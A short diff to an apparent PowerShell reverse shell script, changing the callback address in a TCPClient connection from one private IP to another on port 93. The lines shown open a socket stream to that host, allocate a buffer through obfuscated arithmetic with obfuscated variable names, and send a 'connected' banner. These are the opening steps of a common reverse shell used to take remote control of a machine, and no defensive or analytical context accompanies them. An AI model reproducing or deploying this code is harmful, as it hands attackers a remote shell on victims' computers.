@@ -1,4 +1,4 @@
-$KLK = New-Object System.Net.Sockets.TCPClient('192.168.1.43','93');
+$KLK = New-Object System.Net.Sockets.TCPClient('192.168.22.1','93');
 $PLP = $KLK.GetStream();
 [byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};
 $VVCCA = ([text.encoding]::UTF8).GetBytes("Succesfuly connected .`n`n")
